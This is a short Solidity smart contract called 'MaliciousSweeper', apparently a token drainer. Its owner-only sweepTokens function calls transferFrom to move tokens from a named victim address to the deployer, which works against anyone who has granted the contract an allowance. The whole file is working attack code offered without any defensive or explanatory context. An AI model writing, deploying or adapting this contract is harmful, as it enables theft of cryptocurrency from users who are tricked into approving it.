// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IToken {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract MaliciousSweeper {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function sweepTokens(address tokenAddress, address victimAddress, uint256 amount) external {
        require(msg.sender == owner, "Not authorized");
        IToken(tokenAddress).transferFrom(victimAddress, owner, amount);
    }
}